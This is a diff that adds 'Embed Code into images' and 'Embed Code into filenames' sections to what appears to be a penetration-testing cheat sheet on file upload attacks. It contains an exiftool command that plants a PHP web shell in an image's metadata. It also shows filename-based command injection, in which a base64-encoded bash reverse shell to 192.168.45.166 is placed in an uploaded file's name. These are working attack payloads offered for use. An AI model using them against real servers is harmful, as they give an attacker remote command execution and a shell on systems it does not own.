@@ -128,6 +128,25 @@ Script for all permutations
         done
     done
 
+## Embed Code into images
+
+    exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
+
+    mv lo.jpg lo.php.jpg
+
+## Embed Code into filenames
+
+A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed on the page, or directly executed in the server.
+
+For example, if we name a file file$(whoami).jpg or filewhoami.jpg or file.jpg||whoami, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution. 
+
+Example:
+
+    echo "bash -i >& /dev/tcp/192.168.45.166/444 0>&1" | base64
+
+Download any normal image, and give it the name: cat.jpg
+
+    cp cat.jpg '|smile"'echo <base64_bash_reverse_shell> | base64 -d | bash'".jpg'
 
 ## Web Shells
 
